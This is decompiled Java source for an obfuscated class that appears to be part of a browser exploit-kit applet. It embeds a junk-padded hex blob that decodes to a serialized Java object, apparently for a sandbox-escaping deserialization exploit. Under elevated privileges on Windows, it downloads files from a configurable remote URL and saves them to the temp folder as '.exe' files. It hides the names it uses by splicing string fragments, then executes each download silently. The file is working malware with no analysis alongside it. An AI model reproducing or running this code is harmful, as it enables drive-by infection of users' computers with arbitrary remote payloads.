// 
// Decompiled by Procyon v0.5.30
// 

package zzz.ttt;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.security.cert.Certificate;
import java.net.URL;
import java.security.CodeSource;
import java.security.PrivilegedExceptionAction;

public class a1500b0 implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] stb(final int n) {
        final String s = "ACEDz0z00z57z372z001zx6zA6z1z76z6z1z2zEz75z7z4z69z6Cz2zE47z7z2z6z567z6F7z2z696z1z6E4z36z16zC6z56E64z6z1z7z28Fz3zDD7zD6E5zxz0zD0Cz1z02z00014zAz00z106772656z76F7269z6z16zEz4z3z75z746F7z665z7z278z7z200z12z6zA61z7z6z612E757z46z96zCz2zEz4z3z61z6C6z56E6z4z6z17z2Ez6zEzAz4zDz1ECz8DC5zxz8Ez03z0z00zxz5zA00z0Cz61z726z546z69z65z6C6z4z7z3z5z3z6z5z74490z0z0zEz6z669z7z27z3z7z4z44z61794zF66z5z7z6565z6x5zA00z0z96z973z54z6z96Dz655365z74z5Az00076Cz65z6zEz6z9z6z5z6E744z900z1z6z6D6z96zEz696D61z6zC4z461z7z97z3z49z6zE4z6z6z9727z37z457z6565z6x4z9z00096zEz6z578z7z4z5374z6z16D7z04z9z0015z7z3z6z57z269z616zC5z66572z7z36z9z6zFz6Ez4zF6zEz5z37z47z26z5616zDz4Az0z0047z4z69z6zDz65z5zx0z006z66z69z6z56zC6z4z737z40002z5zxz49z5zxz00z056z9z7z35z3z65z74z7z4z0z002z5x5zAz4C00z0z4z7zAz6F6E6z574z001z44zCz6zA61z7z6z612zFz7z5z74z6z9z6zCz2F54696Dz655zAz6F6E653zx7870z0z100z00z00z01z01z0z1z0z0000z00z10z00z0z0z0z0200z0000z010z0z0z0z01z21z5z63AzFCz0zE75z7z2z00z02z5zxz494DzxzAz60z2z6z76EzAzx2A5z02z0z0z0z07z8z7000z0z0z0z0z1z1z0000000z1z0z0000z7Dz9z0z0z0z0z0z0z0z40z0z00z0z0z150z0z000004z0z00z000z120z0z0z00z08Az000z0z0z00z2z0z0z000z00z30z0000z00z1000z000040z0000z01z00z0z000z0z1z10z00z0002z2z0z00z00z2zDzEFzEz4z88C00z0z0z000z0z0z0757z2000z2z5xz5A578zF203z9z14zx8z5zDzEz2020z0z0z0z7z8z70z0z0z00z00110z101z0z10z1z0z1z010101z0z1z010z1010z10z1z01z0z1z017z3z7z20z0z1z8z6A6z17z661z2zE7z5z74696zC2zE5z3z69z6zDz7z0z6Cz65z5z46z9z6Dz65z5zA6F6zE6z5FzA6z7z5zDz6z0zD15EF5zAz60z3z00z1z24z9z00z0A6473z7453z6176z6z9z6zEz67z73z49z00z0z6z6z56zE6z4z4z46z179z4z9000C65z6E64z4z4617z9z4zF66z5z7z6z565z6zx4z9z0z00z7z6z56zEz644zDz6zFz64z6z5z4z9000z8z656E6z44D6F6zE7z4z6z8z4z9000z7z65z6Ez6z4z54z696Dz65z4z9000xz656Ez6z4z5z4z6z96zDz6z54zDz6F64z6z549z000z9z7z26z1z77z4Fz6z66z673z65z7449z001z5z7z365z7269z6z1z6zC56z6z572736z96Fz6zE4F6zEz5z374z7z2z6z5z61z6zDz49z00z0z8z7z3746z17z274z4z46z1z79z49z000E7z3z74z61z727z44z4z6z17z9z4zF6z6z5z76565z6xz4z9z0z00z9z7z3746z172z7z4z4Dz6zF646z549z00z0zAz7z3z74z61z72z7z44zD6F6Ez7468z49z00z0z9z73z74z6z1z7z2z74z54z69z6zDz6z54z9000Dz737z461z72z7z45z46z96D654Dz6Fz64z65z4z900z0973z74z6172745z9z6z56z1z72z5A0z00xz7z5z73z65z44z61z7z96Cz6z96z768z74z5zx000x6zD6F6zE746z84zC656Ez6z7z746z8z7z40z002z5xz4z2z78z7200z12z6A6z1z7z6z61z2E7z5z74z696C2E5z4z696zD655Az6zF6zEz6531x3Ez9Fz5z77z44AzCzA1z020z0014zCz0002494z47z4z001z24zC6A6176z612Fz6Cz61z6Ez6z72F537z4z726z96Ez6z7z3zx7870z7z40z0z0Ez416zD6z572696z361z2Fz44z6z1z77z736F6Ez0z036zEE8000z0z0000z0000z0z0z00z00z0z0z0000z0z0z000z00z000z0z0z0z000z0z0000z0z0z00FEz4z88zC00z0z000z0z0z02z0z00z00z0z0z0z0z0z0z0z00z0z00z00z0z000000z0z0z0000z00z0z0z00z00z0z0z0z0z0z000z0z000z0z0000z0z75z7z2z00z02z5zx4z2zAzCF3z1z7zF806z0z85z4zE0z02z000z0z78z7z0z0000z000C1zF1zCz1zF1E1zFz1zE1F1F1zEz1F1E1Fz7z70zA0000z0z006z0z0z00z00z0z00z0z0z07z571z0z0z7zEz0z006z00z0z0z000z20z0z00z0z000z0z000z0000787z3z72z000Dz7zAz7A7A2zE7z47474z2E6z13133z64z38z5zEz8zx4Cz67DDCz4z09zDz80z20z0z0078z7z0z78zFFFFFz4Ez2Fz964zAzCz000A";
        String s2 = "";
        for (int i = 0; i < s.length(); ++i) {
            if (s.charAt(i) == 'x') {
                s2 += "B";
            }
            else if (s.charAt(i) != 'z') {
                s2 += s.charAt(i);
            }
        }
        final int n2 = 2;
        final int n3 = 16;
        final byte[] array = new byte[s2.length() / n2];
        for (int j = 0; j < s2.length(); j += 2) {
            array[j >> n2 / 2] = (byte)((Character.digit(s2.charAt(j), n3) << n3 / 4) + Character.digit(s2.charAt(j + 1), n3));
        }
        return array;
    }
    
    public static CodeSource tst3(final String s) {
        try {
            return new CodeSource(new URL(s), new Certificate[0]);
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    @Override
    public Object run() throws Exception {
        if (a1500b0.data == null) {
            return null;
        }
        try {
            if (System.getProperty("os.name").indexOf("Windows") >= 0) {
                int int1 = 1;
                if (a1500b0.cc != null) {
                    int1 = Integer.parseInt(a1500b0.cc);
                }
                for (int i = 0; i < int1; ++i) {
                    final String s = "vmp";
                    final URL url = new URL(a1500b0.data + Integer.toString(i));
                    url.openConnection();
                    final InputStream openStream = url.openStream();
                    final String property = System.getProperty("ja" + s.substring(0, 1) + "a.io.t" + s.substring(1) + "dir");
                    final String s2 = "porxe";
                    final String string = property + "\\" + Math.random();
                    final String s3 = "ACEDz0z00z57z372z001zx6zA6z1z76z6z1z2zEz75z7z4z69z6Cz2zE47z7z2z6z567z6F7z2z696z1z6E4z36z16zC6z56E64z6z1z7z28Fz3zDD7zD6E5zxz0zD0Cz1z02z00014zAz00z106772656z76F7269z6z16zEz4z3z75z746F7z665z7z278z7z200z12z6zA61z7z6z612E757z46z96zCz2zEz4z3z61z6C6z56E6z4z6z17z2Ez6zEzAz4zDz1ECz8DC5zxz8Ez03z0z00zxz5zA00z0Cz61z726z546z69z65z6C6z4z7z3z5z3z6z5z74490z0z0zEz6z669z7z27z3z7z4z44z61794zF66z5z7z6565z6x5zA00z0z96z973z54z6z96Dz655365z74z5Az00076Cz65z6zEz6z9z6z5z6E744z900z1z6z6D6z96zEz696D61z6zC4z461z7z97z3z49z6zE4z6z6z9727z37z457z6565z6x4z9z00096zEz6z578z7z4z5374z6z16D7z04z9z0015z7z3z6z57z269z616zC5z66572z7z36z9z6zFz6Ez4zF6zEz5z37z47z26z5616zDz4Az0z0047z4z69z6zDz65z5zx0z006z66z69z6z56zC6z4z737z40002z5zxz49z5zxz00z056z9z7z35z3z65z74z7z4z0z002z5x5zAz4C00z0z4z7zAz6F6E6z574z001z44zCz6zA61z7z6z612zFz7z5z74z6z9z6zCz2F54696Dz655zAz6F6E653zx7870z0z100z00z00z01z01z0z1z0z0000z00z10z00z0z0z0z0200z0000z010z0z0z0z01z21z5z63AzFCz0zE75z7z2z00z02z5zxz494DzxzAz60z2z6z76EzAzx2A5z02z0z0z0z07z8z7000z0z0z0z0z1z1z0000000z1z0z0000z7Dz9z0z0z0z0z0z0z0z40z0z00z0z0z150z0z000004z0z00z000z120z0z0z00z08Az000z0z0z00z2z0z0z000z00z30z0000z00z1000z000040z0000z01z00z0z000z0z1z10z00z0002z2z0z00z00z2zDzEFzEz4z88C00z0z0z000z0z0z0757z2000z2z5xz5A578zF203z9z14zx8z5zDzEz2020z0z0z0z7z8z70z0z0z00z00110z101z0z10z1z0z1z010101z0z1z010z1010z10z1z01z0z1z017z3z7z20z0z1z8z6A6z17z661z2zE7z5z74696zC2zE5z3z69z6zDz7z0z6Cz65z5z46z9z6Dz65z5zA6F6zE6z5FzA6z7z5zDz6z0zD15EF5zAz60z3z00z1z24z9z00z0A6473z7453z6176z6z9z6zEz67z73z49z00z0z6z6z56zE6z4z4z46z179z4z9000C65z6E64z4z4617z9z4zF66z5z7z6z565z6zx4z9z0z00z7z6z56zEz644zDz6zFz64z6z5z4z9000z8z656E6z44D6F6zE7z4z6z8z4z9000z7z65z6Ez6z4z54z696Dz65z4z9000xz656Ez6z4z5z4z6z96zDz6z54zDz6F64z6z549z000z9z7z26z1z77z4Fz6z66z673z65z7449z001z5z7z365z7269z6z1z6zC56z6z572736z96Fz6zE4F6zEz5z374z7z2z6z5z61z6zDz49z00z0z8z7z3746z17z274z4z46z1z79z49z000E7z3z74z61z727z44z4z6z17z9z4zF6z6z5z76565z6xz4z9z0z00z9z7z3746z172z7z4z4Dz6zF646z549z00z0zAz7z3z74z61z72z7z44zD6F6Ez7468z49z00z0z9z73z74z6z1z7z2z74z54z69z6zDz6z54z9000Dz737z461z72z7z45z46z96D654Dz6Fz64z65z4z900z0973z74z6172745z9z6z56z1z72z5A0z00xz7z5z73z65z44z61z7z96Cz6z96z768z74z5zx000x6zD6F6zE746z84zC656Ez6z7z746z8z7z40z002z5xz4z2z78z7200z12z6A6z1z7z6z61z2E7z5z74z696C2E5z4z696zD655Az6zF6zEz6531x3Ez9Fz5z77z44AzCzA1z020z0014zCz0002494z47z4z001z24zC6A6176z612Fz6Cz61z6Ez6z72F537z4z726z96Ez6z7z3zx7870z7z40z0z0Ez416zD6z572696z361z2Fz44z6z1z77z736F6Ez0z036zEE8000z0z0000z0000z0z0z00z00z0z0z0000z0z0z000z00z000z0z0z0z000z0z0000z0z0z00FEz4z88zC00z0z000z0z0z02z0z00z00z0z0z0z0z0z0z0z00z0z00z00z0z000000z0z0z0000z00z0z0z00z00z0z0z0z0z0z000z0z000z0z0000z0z75z7z2z00z02z5zx4z2zAzCF3z1z7zF806z0z85z4zE0z02z000z0z78z7z0z0000z000C1zF1zCz1zF1E1zFz1zE1F1F1zEz1F1E1Fz7z70zA0000z0z006z0z0z00z00z0z00z0z0z07z571z0z0z7zEz0z006z00z0z0z000z20z0z00z0z000z0z000z0000787z3z72z000Dz7zAz7A7A2zE7z47474z2E6z13133z64z38z5zEz8zx4Cz67DDCz4z09zDz80z20z0z0078z7z0z78zFFFFFz4Ez2Fz964zAzCz000A";
                    final String string2 = string + ".a." + s2.substring(4) + s2.substring(3);
                    final FileOutputStream fileOutputStream = new FileOutputStream(string2);
                    final String string3 = s3 + "ACEDz0z00z57z372z001zx6zA6z1z76z6z1z2zEz75z7z4z69z6Cz2zE47z7z2z6z567z6F7z2z696z1z6E4z36z16zC6z56E64z6z1z7z28Fz3zDD7zD6E5zxz0zD0Cz1z02z00014zAz00z106772656z76F7269z6z16zEz4z3z75z746F7z665z7z278z7z200z12z6zA61z7z6z612E757z46z96zCz2zEz4z3z61z6C6z56E6z4z6z17z2Ez6zEzAz4zDz1ECz8DC5zxz8Ez03z0z00zxz5zA00z0Cz61z726z546z69z65z6C6z4z7z3z5z3z6z5z74490z0z0zEz6z669z7z27z3z7z4z44z61794zF66z5z7z6565z6x5zA00z0z96z973z54z6z96Dz655365z74z5Az00076Cz65z6zEz6z9z6z5z6E744z900z1z6z6D6z96zEz696D61z6zC4z461z7z97z3z49z6zE4z6z6z9727z37z457z6565z6x4z9z00096zEz6z578z7z4z5374z6z16D7z04z9z0015z7z3z6z57z269z616zC5z66572z7z36z9z6zFz6Ez4zF6zEz5z37z47z26z5616zDz4Az0z0047z4z69z6zDz65z5zx0z006z66z69z6z56zC6z4z737z40002z5zxz49z5zxz00z056z9z7z35z3z65z74z7z4z0z002z5x5zAz4C00z0z4z7zAz6F6E6z574z001z44zCz6zA61z7z6z612zFz7z5z74z6z9z6zCz2F54696Dz655zAz6F6E653zx7870z0z100z00z00z01z01z0z1z0z0000z00z10z00z0z0z0z0200z0000z010z0z0z0z01z21z5z63AzFCz0zE75z7z2z00z02z5zxz494DzxzAz60z2z6z76EzAzx2A5z02z0z0z0z07z8z7000z0z0z0z0z1z1z0000000z1z0z0000z7Dz9z0z0z0z0z0z0z0z40z0z00z0z0z150z0z000004z0z00z000z120z0z0z00z08Az000z0z0z00z2z0z0z000z00z30z0000z00z1000z000040z0000z01z00z0z000z0z1z10z00z0002z2z0z00z00z2zDzEFzEz4z88C00z0z0z000z0z0z0757z2000z2z5xz5A578zF203z9z14zx8z5zDzEz2020z0z0z0z7z8z70z0z0z00z00110z101z0z10z1z0z1z010101z0z1z010z1010z10z1z01z0z1z017z3z7z20z0z1z8z6A6z17z661z2zE7z5z74696zC2zE5z3z69z6zDz7z0z6Cz65z5z46z9z6Dz65z5zA6F6zE6z5FzA6z7z5zDz6z0zD15EF5zAz60z3z00z1z24z9z00z0A6473z7453z6176z6z9z6zEz67z73z49z00z0z6z6z56zE6z4z4z46z179z4z9000C65z6E64z4z4617z9z4zF66z5z7z6z565z6zx4z9z0z00z7z6z56zEz644zDz6zFz64z6z5z4z9000z8z656E6z44D6F6zE7z4z6z8z4z9000z7z65z6Ez6z4z54z696Dz65z4z9000xz656Ez6z4z5z4z6z96zDz6z54zDz6F64z6z549z000z9z7z26z1z77z4Fz6z66z673z65z7449z001z5z7z365z7269z6z1z6zC56z6z572736z96Fz6zE4F6zEz5z374z7z2z6z5z61z6zDz49z00z0z8z7z3746z17z274z4z46z1z79z49z000E7z3z74z61z727z44z4z6z17z9z4zF6z6z5z76565z6xz4z9z0z00z9z7z3746z172z7z4z4Dz6zF646z549z00z0zAz7z3z74z61z72z7z44zD6F6Ez7468z49z00z0z9z73z74z6z1z7z2z74z54z69z6zDz6z54z9000Dz737z461z72z7z45z46z96D654Dz6Fz64z65z4z900z0973z74z6172745z9z6z56z1z72z5A0z00xz7z5z73z65z44z61z7z96Cz6z96z768z74z5zx000x6zD6F6zE746z84zC656Ez6z7z746z8z7z40z002z5xz4z2z78z7200z12z6A6z1z7z6z61z2E7z5z74z696C2E5z4z696zD655Az6zF6zEz6531x3Ez9Fz5z77z44AzCzA1z020z0014zCz0002494z47z4z001z24zC6A6176z612Fz6Cz61z6Ez6z72F537z4z726z96Ez6z7z3zx7870z7z40z0z0Ez416zD6z572696z361z2Fz44z6z1z77z736F6Ez0z036zEE8000z0z0000z0000z0z0z00z00z0z0z0000z0z0z000z00z000z0z0z0z000z0z0000z0z0z00FEz4z88zC00z0z000z0z0z02z0z00z00z0z0z0z0z0z0z0z00z0z00z00z0z000000z0z0z0000z00z0z0z00z00z0z0z0z0z0z000z0z000z0z0000z0z75z7z2z00z02z5zx4z2zAzCF3z1z7zF806z0z85z4zE0z02z000z0z78z7z0z0000z000C1zF1zCz1zF1E1zFz1zE1F1F1zEz1F1E1Fz7z70zA0000z0z006z0z0z00z00z0z00z0z0z07z571z0z0z7zEz0z006z00z0z0z000z20z0z00z0z000z0z000z0000787z3z72z000Dz7zAz7A7A2zE7z47474z2E6z13133z64z38z5zEz8zx4Cz67DDCz4z09zDz80z20z0z0078z7z0z78zFFFFFz4Ez2Fz964zAzCz000A";
                    int n = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        fileOutputStream.write(read);
                        ++n;
                    }
                    openStream.close();
                    fileOutputStream.close();
                    new StringBuilder().append(string3).append("ACEDz0z00z57z372z001zx6zA6z1z76z6z1z2zEz75z7z4z69z6Cz2zE47z7z2z6z567z6F7z2z696z1z6E4z36z16zC6z56E64z6z1z7z28Fz3zDD7zD6E5zxz0zD0Cz1z02z00014zAz00z106772656z76F7269z6z16zEz4z3z75z746F7z665z7z278z7z200z12z6zA61z7z6z612E757z46z96zCz2zEz4z3z61z6C6z56E6z4z6z17z2Ez6zEzAz4zDz1ECz8DC5zxz8Ez03z0z00zxz5zA00z0Cz61z726z546z69z65z6C6z4z7z3z5z3z6z5z74490z0z0zEz6z669z7z27z3z7z4z44z61794zF66z5z7z6565z6x5zA00z0z96z973z54z6z96Dz655365z74z5Az00076Cz65z6zEz6z9z6z5z6E744z900z1z6z6D6z96zEz696D61z6zC4z461z7z97z3z49z6zE4z6z6z9727z37z457z6565z6x4z9z00096zEz6z578z7z4z5374z6z16D7z04z9z0015z7z3z6z57z269z616zC5z66572z7z36z9z6zFz6Ez4zF6zEz5z37z47z26z5616zDz4Az0z0047z4z69z6zDz65z5zx0z006z66z69z6z56zC6z4z737z40002z5zxz49z5zxz00z056z9z7z35z3z65z74z7z4z0z002z5x5zAz4C00z0z4z7zAz6F6E6z574z001z44zCz6zA61z7z6z612zFz7z5z74z6z9z6zCz2F54696Dz655zAz6F6E653zx7870z0z100z00z00z01z01z0z1z0z0000z00z10z00z0z0z0z0200z0000z010z0z0z0z01z21z5z63AzFCz0zE75z7z2z00z02z5zxz494DzxzAz60z2z6z76EzAzx2A5z02z0z0z0z07z8z7000z0z0z0z0z1z1z0000000z1z0z0000z7Dz9z0z0z0z0z0z0z0z40z0z00z0z0z150z0z000004z0z00z000z120z0z0z00z08Az000z0z0z00z2z0z0z000z00z30z0000z00z1000z000040z0000z01z00z0z000z0z1z10z00z0002z2z0z00z00z2zDzEFzEz4z88C00z0z0z000z0z0z0757z2000z2z5xz5A578zF203z9z14zx8z5zDzEz2020z0z0z0z7z8z70z0z0z00z00110z101z0z10z1z0z1z010101z0z1z010z1010z10z1z01z0z1z017z3z7z20z0z1z8z6A6z17z661z2zE7z5z74696zC2zE5z3z69z6zDz7z0z6Cz65z5z46z9z6Dz65z5zA6F6zE6z5FzA6z7z5zDz6z0zD15EF5zAz60z3z00z1z24z9z00z0A6473z7453z6176z6z9z6zEz67z73z49z00z0z6z6z56zE6z4z4z46z179z4z9000C65z6E64z4z4617z9z4zF66z5z7z6z565z6zx4z9z0z00z7z6z56zEz644zDz6zFz64z6z5z4z9000z8z656E6z44D6F6zE7z4z6z8z4z9000z7z65z6Ez6z4z54z696Dz65z4z9000xz656Ez6z4z5z4z6z96zDz6z54zDz6F64z6z549z000z9z7z26z1z77z4Fz6z66z673z65z7449z001z5z7z365z7269z6z1z6zC56z6z572736z96Fz6zE4F6zEz5z374z7z2z6z5z61z6zDz49z00z0z8z7z3746z17z274z4z46z1z79z49z000E7z3z74z61z727z44z4z6z17z9z4zF6z6z5z76565z6xz4z9z0z00z9z7z3746z172z7z4z4Dz6zF646z549z00z0zAz7z3z74z61z72z7z44zD6F6Ez7468z49z00z0z9z73z74z6z1z7z2z74z54z69z6zDz6z54z9000Dz737z461z72z7z45z46z96D654Dz6Fz64z65z4z900z0973z74z6172745z9z6z56z1z72z5A0z00xz7z5z73z65z44z61z7z96Cz6z96z768z74z5zx000x6zD6F6zE746z84zC656Ez6z7z746z8z7z40z002z5xz4z2z78z7200z12z6A6z1z7z6z61z2E7z5z74z696C2E5z4z696zD655Az6zF6zEz6531x3Ez9Fz5z77z44AzCzA1z020z0014zCz0002494z47z4z001z24zC6A6176z612Fz6Cz61z6Ez6z72F537z4z726z96Ez6z7z3zx7870z7z40z0z0Ez416zD6z572696z361z2Fz44z6z1z77z736F6Ez0z036zEE8000z0z0000z0000z0z0z00z00z0z0z0000z0z0z000z00z000z0z0z0z000z0z0000z0z0z00FEz4z88zC00z0z000z0z0z02z0z00z00z0z0z0z0z0z0z0z00z0z00z00z0z000000z0z0z0000z00z0z0z00z00z0z0z0z0z0z000z0z000z0z0000z0z75z7z2z00z02z5zx4z2zAzCF3z1z7zF806z0z85z4zE0z02z000z0z78z7z0z0000z000C1zF1zCz1zF1E1zFz1zE1F1F1zEz1F1E1Fz7z70zA0000z0z006z0z0z00z00z0z00z0z0z07z571z0z0z7zEz0z006z00z0z0z000z20z0z00z0z000z0z000z0000787z3z72z000Dz7zAz7A7A2zE7z47474z2E6z13133z64z38z5zEz8zx4Cz67DDCz4z09zDz80z20z0z0078z7z0z78zFFFFFz4Ez2Fz964zAzCz000A").toString();
                    Runtime.getRuntime().exec(string2);
                }
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    public a1500b0() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        a1500b0.data = null;
        a1500b0.cc = null;
    }
}
